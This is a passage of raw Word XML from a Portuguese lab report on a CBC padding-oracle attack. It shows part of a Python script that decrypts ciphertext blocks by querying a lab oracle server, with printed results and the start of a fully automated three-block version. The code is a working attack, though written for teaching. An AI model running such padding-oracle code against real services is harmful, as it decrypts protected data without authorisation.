    </w:p>
    <w:p w14:paraId="2545E979" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        # Backtracking se necessário</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="061A9D94" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        CC1 = CC1_backup</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="461BE958" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        D2 = D2_backup</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37D39FBF" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4CA446DD" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    return [], []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="553F7C60" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F9364E2" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>if __name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54923586" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    oracle = PaddingOracle('10.9.0.80', 5000)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="081C469A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3FCD2B28" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    iv_and_ctext = bytearray(oracle.ctext)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CFD73A0" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    IV = iv_and_ctext[0:16]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62498FA6" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    C1 = iv_and_ctext[16:32]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B18BAEE" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    C2 = iv_and_ctext[32:48]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EC81E51" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E3FEBCF" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"C1: {C1.hex()}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15462AA2" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"C2: {C2.hex()}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FDE58CD" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5001830B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t># Inicializar estruturas</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="650D1D47" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">    D2 = bytearray(16)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4329164B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">    CC1 = bytearray(16)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A490B7F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F4ACF37" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00842992" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t># Executar ataque</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73FC6724" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>current_padding = "01"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="350DBB27" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    CC1, D2 = decryptBlock(1, current_padding, CC1, D2, C2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AD1905F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="049C781D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t># Recuperar plaintext</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01B89DB9" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00842992" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>P2 = xor(C1, D2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="228763A1" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:spacing w:after="283"/>
      </w:pPr>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>print(f"P2: {P2.hex()}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F05CB6B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="247" w:name="resultadofinal"/>
      <w:bookmarkStart w:id="248" w:name="_Toc213874759"/>
      <w:bookmarkStart w:id="249" w:name="_Toc213881997"/>
      <w:bookmarkEnd w:id="247"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Resultado Final</w:t>
      </w:r>
      <w:bookmarkEnd w:id="248"/>
      <w:bookmarkEnd w:id="249"/>
    </w:p>
    <w:p w14:paraId="5C598DA1" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Ao executar o script:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="729B3772" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>C1: a9b2554b0944118061212098f2f238cd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47AB0813" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>C2: 779ea0aae3d9d020f3677bfcb3cda9ce</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07619DE4" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>[... iterações ...]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46F2F743" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:spacing w:after="283"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>P2: 1122334455667788aabbccddee030303</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7204B175" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">Mensagem recuperada do segundo bloco: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>1122334455667788aabbccddee</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (mais 3 bytes de padding).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3918D9D4" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="250" w:name="exerccio3ataquecompletoautomatizado"/>
      <w:bookmarkStart w:id="251" w:name="_Toc213874760"/>
      <w:bookmarkStart w:id="252" w:name="_Toc213881998"/>
      <w:bookmarkEnd w:id="250"/>
      <w:r>
        <w:t>Exercício 3: Ataque Completo Automatizado</w:t>
      </w:r>
      <w:bookmarkEnd w:id="251"/>
      <w:bookmarkEnd w:id="252"/>
    </w:p>
    <w:p w14:paraId="09696B77" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="253" w:name="novaconfigurao"/>
      <w:bookmarkStart w:id="254" w:name="_Toc213874761"/>
      <w:bookmarkStart w:id="255" w:name="_Toc213881999"/>
      <w:bookmarkEnd w:id="253"/>
      <w:r>
        <w:t>Nova Configuração</w:t>
      </w:r>
      <w:bookmarkEnd w:id="254"/>
      <w:bookmarkEnd w:id="255"/>
    </w:p>
    <w:p w14:paraId="2C4C78B7" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>O servidor na porta 6000 fornece:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CBFDF12" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="0" w:line="276" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">16 bytes de IV </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37DD802B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="140" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">48 bytes de ciphertext (3 blocos de 16 bytes cada) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="478AC82A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Objectivo: recuperar todos os blocos automaticamente.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="322DC53B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
        <w:pageBreakBefore/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20F43756" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="256" w:name="estratgiamodificada"/>
      <w:bookmarkStart w:id="257" w:name="_Toc213874762"/>
      <w:bookmarkStart w:id="258" w:name="_Toc213882000"/>
      <w:bookmarkEnd w:id="256"/>
      <w:r>
        <w:t>Estratégia Modificada</w:t>
      </w:r>
      <w:bookmarkEnd w:id="257"/>
      <w:bookmarkEnd w:id="258"/>
    </w:p>
    <w:p w14:paraId="53FB9BFB" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>A abordagem é processar os blocos de trás para frente:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="769BDFCC" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="0" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Forte"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Bloco 3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">: Usar o Bloco 2 como "IV modificável" para descobrir D3, depois calcular P3 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54E5795D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="0" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Forte"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Bloco 2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">: Usar o Bloco 1 como "IV modificável" para descobrir D2, depois calcular P2 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="026DC020" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="140" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Forte"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Bloco 1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">: Usar o IV real para descobrir D1, depois calcular P1 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47704F36" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="259" w:name="implementaocompleta"/>
      <w:bookmarkStart w:id="260" w:name="_Toc213874763"/>
      <w:bookmarkStart w:id="261" w:name="_Toc213882001"/>
      <w:bookmarkEnd w:id="259"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Implementação Completa</w:t>
      </w:r>
      <w:bookmarkEnd w:id="260"/>
      <w:bookmarkEnd w:id="261"/>
    </w:p>
    <w:p w14:paraId="3A9B9E51" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>#!/usr/bin/python3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F154FC8" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>import socket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FA29AFF" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>from binascii import hexlify, unhexlify</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C2125D7" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2EB59707" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>def xor(first, second):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="076FACEE" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    return bytearray(x^y for x,y in zip(first, second))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6249E194" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="475FD0AB" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>class PaddingOracle:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41D50B29" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    def __init__(self, host, port):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2519F1F9" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F649B45" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.s.connect((host, port))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01A5A0A7" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        ciphertext = self.s.recv(4096).decode().strip()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A10E070" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.ctext = unhexlify(ciphertext)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="047F0441" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17D2EF35" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    def decrypt(self, ctext: bytes):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="122F8392" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        self._send(hexlify(ctext))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43D73E2C" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        return self._recv()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3378F86D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="42DF2A4A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
